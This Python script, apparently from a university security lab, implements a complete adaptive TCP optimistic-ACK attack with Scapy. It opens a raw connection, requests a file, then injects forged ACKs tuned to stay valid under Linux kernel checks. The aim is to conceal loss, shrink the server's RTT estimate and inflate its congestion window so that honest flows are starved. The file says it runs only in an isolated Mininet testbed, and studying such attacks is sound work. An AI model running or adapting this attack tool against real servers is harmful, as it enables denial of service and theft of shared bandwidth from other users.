#!/usr/bin/env python3
"""
optimistic_client.py — Adaptive TCP Optimistic-ACK Generator (h2: 10.0.0.3)
CSE 406: Computer Security Lab Project

Performs a legitimate TCP 3-way handshake and HTTP GET, then injects ACK
segments *optimistically* — acknowledging data the server has already sent
but that the attacker may not have received yet — to hide congestion loss and
compress the server's RTT estimate, inflating its congestion window far beyond
the path's capacity and starving competing honest flows (Savage et al. 1999,
"TCP Congestion Control with a Misbehaving Receiver"; Sherwood et al. 2005).

Why the naive versions fail (and what this fixes)
-------------------------------------------------
* Too aggressive (fixed-rate advance): the ACK pointer marches at a constant
  rate and quickly passes the server's real ``snd_nxt``. Verified against the
  Linux kernel (``tcp_ack()``: ``if (after(ack, tp->snd_nxt))``): such an ACK
  is DROPPED (``SKB_DROP_REASON_TCP_ACK_UNSENT_DATA``) — it does NOT advance
  ``snd_una``. With no valid ACK arriving, the oldest genuinely-unacked segment
  times out → RTO → ``cwnd`` collapses to 1. The attack destroys itself.
* Too timid (ACK only received data): under an inflated window the bottleneck
  drops the tail of every burst; those bytes never arrive, so the ACK stalls,
  the server sees the loss and backs off. No theft — just a fair-share flow.

The sustainable middle ground (this implementation)
---------------------------------------------------
The ACK is *delivery-clocked*: it rides on ``rcv_high`` (the highest byte the
sniffer has actually seen leave the server) plus a **bounded, adaptive
margin** that stays strictly inside the in-flight window, so it is (almost
always) a valid ACK ``received < ack <= snd_nxt``:

    ack = rcv_high + margin,   margin = f * rate_est * RTT0

* ``rate_est`` is an EWMA of the server's *measured* delivery rate, so the
  long-run ACK-advance rate equals the true send rate and can never run away.
* ``f`` in [F_MIN, F_MAX] is AIMD-controlled: it probes up slowly while data
  flows and is halved the instant delivery stalls (the only observable symptom
  of an accidental overshoot). On stall, margin drops to 0 so the next ACK is
  ``rcv_high`` — valid with certainty — which re-opens the window well within
  the RTO. This is the liveness invariant that keeps the connection alive.
* Because ``rcv_high`` is a *cumulative* high-water mark, ACKing it already
  covers bytes dropped in the bottleneck queue — concealing the loss so the
  server never retransmits and never reduces ``cwnd``. That concealment is the
  attack's primary weapon; the margin adds RTT compression on top.

Kernel RST from the attacker host is dropped by an iptables rule installed in
topology.py, so this user-space Scapy connection is not torn down. All traffic
stays within the isolated Mininet testbed.
"""

import argparse
import logging
import math
import signal
import sys
import threading
import time

# Silence Scapy's optional-layer loader BEFORE import: on some distros the
# bundled Scapy fails to load scapy.layers.tls (cryptography API drift), which
# is harmless noise for us. Importing the specific core layers below also
# avoids pulling in the TLS/Kerberos/SPNEGO chain that triggers it.
logging.getLogger("scapy").setLevel(logging.CRITICAL)

try:
    from scapy.layers.inet import IP, TCP
    from scapy.packet import Raw
    from scapy.sendrecv import sr1, send, sniff
    from scapy.config import conf
    from scapy.volatile import RandShort
except Exception:  # pragma: no cover - fallback for unusual layouts
    from scapy.all import IP, TCP, Raw, send, sr1, sniff, conf, RandShort

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [OptACK] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("optimistic_client")

conf.verb = 0

MSS = 1460
MASK = 0xFFFFFFFF


class OptimisticACKClient:
    """
    Adaptive, delivery-clocked optimistic-ACK attacker.

    A background sniffer tracks ``rcv_high`` (highest byte delivered past the
    bottleneck) and ``rate_est`` (EWMA of the server's delivery rate). The
    injection loop ACKs ``rcv_high + margin`` where ``margin`` is a bounded
    fraction of one bandwidth-delay product, adapted by AIMD and collapsed to
    zero the instant delivery stalls — keeping every ACK valid and the
    connection alive while the server's cwnd inflates.
    """

    def __init__(self, server_ip, server_port, src_port, target_bw_mbps,
                 duration, multiplier):
        self.server_ip = server_ip
        self.server_port = server_port
        self.src_port = src_port
        self.target_bw_mbps = target_bw_mbps
        self.duration = duration
        self.multiplier = multiplier

        self.c0 = int(RandShort()) << 16 | int(RandShort())
        self.s0 = None
        self.client_seq = None

        # ---- shared state (written by the sniffer thread) ----
        self.lock = threading.Lock()
        self.rcv_high = 0            # highest (seq + payload_len) delivered
        self.rate_est = 0.0          # EWMA of server delivery rate (bytes/s)
        self.rate_peak = 0.0         # high-water of rate_est (bytes/s)
        self.t_last_data = 0.0       # monotonic time of last data packet
        self._last_seq_time = 0.0    # for inter-arrival EWMA
        self.data_pkts_seen = 0
        self.total_server_bytes = 0

        self.last_acked = 0          # highest ack_seq we have sent (for logs)
        self.measured_rtt = None     # from handshake

        self.running = False
        self.sniffer_thread = None
        self.l3 = None               # persistent send socket

        self.stats = {
            "acks_sent": 0,
            "bytes_claimed": 0,
            "optimistic_acks": 0,    # ACKs sent ahead of confirmed-received data
            "backoffs": 0,           # stall-triggered margin collapses
        }

    # ------------------------------------------------------------------
    # 32-bit sequence arithmetic (wraparound-safe)
    # ------------------------------------------------------------------
    @staticmethod
    def seq_after(a, b):
        """True if a > b in 32-bit sequence space."""
        d = (a - b) & MASK
        return d != 0 and d < 0x80000000

    @staticmethod
    def seq_max(a, b):
        return a if OptimisticACKClient.seq_after(a, b) else b

    # ------------------------------------------------------------------
    # TCP Handshake — also measures the base RTT (before any queue builds)
    # ------------------------------------------------------------------
    def handshake(self):
        log.info("Starting 3-way handshake to %s:%d", self.server_ip,
                 self.server_port)

        # NOTE: deliberately no ("Timestamp", ...) option. Without TCP
        # timestamps the server measures RTT from each segment's send time, so
        # our early (optimistic) ACKs directly shrink its srtt. Negotiating
        # timestamps would let the server derive RTT from the echoed TSval and
        # blunt the RTT-compression half of the attack.
        syn = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.c0, flags="S",
                  options=[("MSS", MSS), ("WScale", 7)])
        )

        t0 = time.monotonic()
        syn_ack = sr1(syn, timeout=5)
        self.measured_rtt = time.monotonic() - t0

        if syn_ack is None or not syn_ack.haslayer(TCP):
            log.error("No SYN-ACK received — is the server running?")
            sys.exit(1)
        if syn_ack[TCP].flags != 0x12:
            log.error("Unexpected flags: 0x%02x", int(syn_ack[TCP].flags))
            sys.exit(1)

        self.s0 = syn_ack[TCP].seq
        initial_ack = (self.s0 + 1) & MASK
        self.last_acked = initial_ack
        self.rcv_high = initial_ack
        self.client_seq = (self.c0 + 1) & MASK

        ack = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.client_seq, ack=initial_ack,
                  flags="A", window=65535)
        )
        send(ack)

        log.info("Handshake complete — server ISN=%d, base RTT=%.1f ms",
                 self.s0, self.measured_rtt * 1000)

    # ------------------------------------------------------------------
    # HTTP GET
    # ------------------------------------------------------------------
    def send_get(self, path="/video.mp4"):
        http_req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.server_ip}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        payload = http_req.encode()
        pkt = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.client_seq, ack=self.rcv_high,
                  flags="PA", window=65535)
            / Raw(load=payload)
        )
        send(pkt)
        self.client_seq = (self.client_seq + len(payload)) & MASK
        log.info("Sent HTTP GET %s", path)

    # ------------------------------------------------------------------
    # Background sniffer — tracks rcv_high and the delivery rate (EWMA)
    # ------------------------------------------------------------------
    def _sniffer_callback(self, pkt):
        if not pkt.haslayer(TCP):
            return
        tcp = pkt[TCP]
        if tcp.sport != self.server_port or tcp.dport != self.src_port:
            return

        payload_len = len(tcp.payload) if tcp.payload else 0
        if payload_len <= 0:
            return

        new_hi = (tcp.seq + payload_len) & MASK
        now = time.monotonic()
        with self.lock:
            self.rcv_high = self.seq_max(self.rcv_high, new_hi)
            self.data_pkts_seen += 1
            self.total_server_bytes += payload_len

            dt = now - self._last_seq_time
            if dt > 0:
                inst = payload_len / dt
                # Time-aware EWMA: a short gap contributes little, so a burst of
                # back-to-back packets over a tiny dt cannot spike the estimate.
                a = 1.0 - math.exp(-dt / self.RATE_TAU)
                self.rate_est = (1.0 - a) * self.rate_est + a * inst
                # Clamp to a sane physical ceiling (guards the margin cap
                # against a pathological instantaneous spike).
                if self.rate_est > self.RATE_CEIL:
                    self.rate_est = self.RATE_CEIL
                if self.rate_est > self.rate_peak:
                    self.rate_peak = self.rate_est
            self._last_seq_time = now
            self.t_last_data = now

    def start_sniffer(self):
        bpf = (f"tcp and src host {self.server_ip} and src port "
               f"{self.server_port} and dst port {self.src_port}")

        def _run():
            sniff(filter=bpf, prn=self._sniffer_callback,
                  stop_filter=lambda _: not self.running,
                  store=False, timeout=self.duration + 10)

        self.sniffer_thread = threading.Thread(target=_run, daemon=True)
        self.sniffer_thread.start()

    # ------------------------------------------------------------------
    # Derive controller constants from the measured link + CLI knobs
    # ------------------------------------------------------------------
    def compute_parameters(self):
        rtt0 = self.measured_rtt if self.measured_rtt else 0.1
        rtt0 = min(max(rtt0, 0.02), 0.5)          # sane bounds
        self.RTT0 = rtt0

        # rate_est smoothing (~half an RTT): reacts within half a round trip to
        # a genuine delivery drop yet ignores per-packet jitter.
        self.RATE_TAU = max(0.02, rtt0 / 2.0)
        # Physical ceiling for the rate estimate: generous headroom over the
        # nominal path so a real rate is never clipped, but a spike is bounded.
        self.RATE_CEIL = (self.target_bw_mbps * 1e6 / 8.0) * 2.0

        # AIMD aggressiveness band. 'multiplier' scales the ceiling: 2.0 -> 0.70
        # (perceived RTT ~ 0.30*real). Clamped so we never pre-ack a full pipe.
        self.F_MAX = min(0.85, max(0.35, 0.35 * self.multiplier))
        self.F_INIT = 0.6 * self.F_MAX
        self.F_MIN = 0.35 * self.F_MAX
        self.F_STEP = 0.05
        self.F_BACKOFF = 0.5

        # Hard ceiling on the lead: a fraction of ONE *measured* BDP, so the ack
        # can never reach the real snd_nxt even if f and rate_est are both high.
        self.MARGIN_CAP_FRAC = 0.75

        # Loop pacing and liveness thresholds.
        self.ACK_INTERVAL = 0.002       # 500 Hz poll (naturally caps send rate)
        self.STALL_GAP = 0.030          # s of silence => overshoot/stall symptom
        self.KEEPALIVE = 0.040          # max spacing for an unchanged ack

        # Advertised receive window: large enough to keep the bottleneck
        # saturated (>> BDP+queue) yet bounded, so worst-case in-flight — and
        # the collateral queue drops — stay in check. WScale 7 was negotiated.
        self.rwnd_bytes = 400 * MSS
        self.win_field = min(0xFFFF, self.rwnd_bytes >> 7)

        bw = self.target_bw_mbps * 1e6 / 8.0
        log.info("=== Attack parameters (auto-computed) ===")
        log.info("  Base RTT (RTT0):    %.1f ms", rtt0 * 1000)
        log.info("  Nominal BDP:        %d B (%d MSS)",
                 int(bw * rtt0), int(bw * rtt0 / MSS))
        log.info("  Aggressiveness f:   init=%.2f  band=[%.2f, %.2f]",
                 self.F_INIT, self.F_MIN, self.F_MAX)
        log.info("  Margin cap:         %.2f x measured BDP", self.MARGIN_CAP_FRAC)
        log.info("  ACK poll rate:      %.0f Hz", 1.0 / self.ACK_INTERVAL)
        log.info("  Advertised rwnd:    %d B (field %d << 7)",
                 self.rwnd_bytes, self.win_field)

    # ------------------------------------------------------------------
    # Adaptive optimistic-ACK injection loop
    # ------------------------------------------------------------------
    def inject_acks(self):
        self.running = True
        now0 = time.monotonic()
        with self.lock:
            self.t_last_data = now0
            self._last_seq_time = now0

        self.start_sniffer()
        time.sleep(0.5)                 # let a little data arrive first
        self.compute_parameters()

        # Persistent L3 socket + reused ACK template: assigning .ack invalidates
        # Scapy's build cache so checksums recompute, but we skip re-parsing the
        # whole packet each tick — important at hundreds of ACKs/second.
        self.l3 = conf.L3socket()
        ack_tmpl = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.client_seq, flags="A", window=self.win_field)
        )

        start_time = time.monotonic()
        log.info("Starting adaptive optimistic-ACK injection for %d s",
                 self.duration)

        f = self.F_INIT
        t_grow = start_time
        last_sent_ack = self.last_acked
        last_emit = 0.0
        last_log = start_time

        while self.running:
            now = time.monotonic()
            elapsed = now - start_time
            if elapsed >= self.duration:
                break

            with self.lock:
                rcv_high = self.rcv_high
                r = self.rate_est
                rp = self.rate_peak
                tld = self.t_last_data

            # (1) Overshoot / stall detection. The only observable symptom of an
            #     ack passing snd_nxt is that the server stops advancing snd_una
            #     and therefore stops sending: no new data for STALL_GAP, or the
            #     delivery rate collapsing well below its own peak.
            stalled = (now - tld > self.STALL_GAP) or (rp > 0 and r < 0.5 * rp)

            if stalled:
                f = max(self.F_MIN, f * self.F_BACKOFF)
                margin = 0.0
                self.stats["backoffs"] += 1
            else:
                if now - t_grow >= self.RTT0:      # AIMD additive probe, 1x/RTT
                    f = min(self.F_MAX, f + self.F_STEP)
                    t_grow = now
                margin = f * r * self.RTT0

            # (2) Hard clamp: never lead by more than a fraction of one measured
            #     BDP, regardless of f / rate spikes.
            cap = self.MARGIN_CAP_FRAC * rp * self.RTT0
            if cap > 0:
                margin = min(margin, cap)
            ack = (rcv_high + int(margin)) & MASK

            # (3) Emit. Send whenever the ack VALUE changes (monotone rcv_high
            #     keeps successive values distinct, so backoff acks never form a
            #     3-identical dup-ack burst) or once per KEEPALIVE to keep the
            #     window open during a lull.
            if ack != last_sent_ack or (now - last_emit) >= self.KEEPALIVE:
                ack_tmpl[TCP].ack = ack
                try:
                    self.l3.send(ack_tmpl)
                except OSError:
                    send(ack_tmpl)     # fall back if the socket hiccups

                adv = (ack - last_sent_ack) & MASK
                if adv and adv < 0x80000000:
                    self.stats["bytes_claimed"] += adv
                self.stats["acks_sent"] += 1
                if self.seq_after(ack, rcv_high):
                    self.stats["optimistic_acks"] += 1
                last_sent_ack = ack
                last_emit = now
                with self.lock:
                    self.last_acked = self.seq_max(self.last_acked, ack)

            # (4) Periodic progress line
            if now - last_log >= 5.0:
                with self.lock:
                    pkts = self.data_pkts_seen
                    total = self.total_server_bytes
                lead = (last_sent_ack - rcv_high) & MASK
                lead_signed = lead if lead < 0x80000000 else lead - (1 << 32)
                log.info(
                    "t=%2.0fs | f=%.2f | rate=%.1f Mbps | ACKs=%d (opt=%d, "
                    "backoff=%d) | data=%d pkts (%.1f MB) | lead=%+d B",
                    elapsed, f, r * 8 / 1e6, self.stats["acks_sent"],
                    self.stats["optimistic_acks"], self.stats["backoffs"],
                    pkts, total / 1e6, lead_signed)
                last_log = now

            time.sleep(self.ACK_INTERVAL)

        self.running = False
        self._print_summary(time.monotonic() - start_time)

    # ------------------------------------------------------------------
    def _print_summary(self, total_time):
        with self.lock:
            total_server = self.total_server_bytes
            data_pkts = self.data_pkts_seen
            peak = self.rate_peak

        log.info("=== Injection summary ===")
        log.info("Duration:          %.1f s", total_time)
        log.info("ACKs sent:         %d (optimistic: %d, backoffs: %d)",
                 self.stats["acks_sent"], self.stats["optimistic_acks"],
                 self.stats["backoffs"])
        log.info("Bytes claimed:     %d (%.2f MB)",
                 self.stats["bytes_claimed"], self.stats["bytes_claimed"] / 1e6)
        log.info("Server data seen:  %d pkts (%.2f MB)",
                 data_pkts, total_server / 1e6)
        if total_time > 0:
            delivered_bw = total_server * 8 / total_time / 1e6
            log.info("Delivered goodput: %.2f Mbps (peak rate est %.2f Mbps)",
                     delivered_bw, peak * 8 / 1e6)
        log.info("Effective ACK rate: %.0f ACKs/s",
                 self.stats["acks_sent"] / max(total_time, 0.001))

    # ------------------------------------------------------------------
    # Teardown
    # ------------------------------------------------------------------
    def teardown(self):
        fin = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.client_seq, ack=self.last_acked,
                  flags="FA", window=self.win_field if hasattr(self, "win_field")
                  else 65535)
        )
        send(fin)
        log.info("FIN sent — connection teardown initiated")

    def stop(self):
        self.running = False


def main():
    parser = argparse.ArgumentParser(
        description="Adaptive TCP optimistic-ACK generator for CSE 406 lab"
    )
    parser.add_argument("--server", default="10.0.1.2",
        help="Target server IP (default: 10.0.1.2)")
    parser.add_argument("--port", type=int, default=80,
        help="Target server port (default: 80)")
    parser.add_argument("--sport", type=int, default=44444,
        help="Source port (default: 44444)")
    parser.add_argument("--target-bw", type=int, default=20,
        help="Nominal path bandwidth used to size the rate ceiling, Mbps "
             "(default: 20)")
    parser.add_argument("--multiplier", type=float, default=2.0,
        help="Aggressiveness: scales the max pre-ACK fraction of a pipe "
             "(2.0 -> f_max 0.70). Higher = more RTT compression, more risk "
             "(default: 2.0)")
    parser.add_argument("--duration", type=int, default=60,
        help="Attack duration in seconds (default: 60)")
    # Legacy args (ignored, kept for run_experiment.sh backward compatibility)
    parser.add_argument("--delta", type=int, default=0, help=argparse.SUPPRESS)
    parser.add_argument("--rate", type=float, default=0, help=argparse.SUPPRESS)
    args = parser.parse_args()

    client = OptimisticACKClient(
        server_ip=args.server,
        server_port=args.port,
        src_port=args.sport,
        target_bw_mbps=args.target_bw,
        duration=args.duration,
        multiplier=args.multiplier,
    )

    def sigint_handler(sig, frame):
        log.info("SIGINT received — stopping injection")
        client.stop()

    signal.signal(signal.SIGINT, sigint_handler)

    client.handshake()
    time.sleep(0.5)
    client.send_get()
    time.sleep(1.0)
    client.inject_acks()
    client.teardown()


if __name__ == "__main__":
    main()
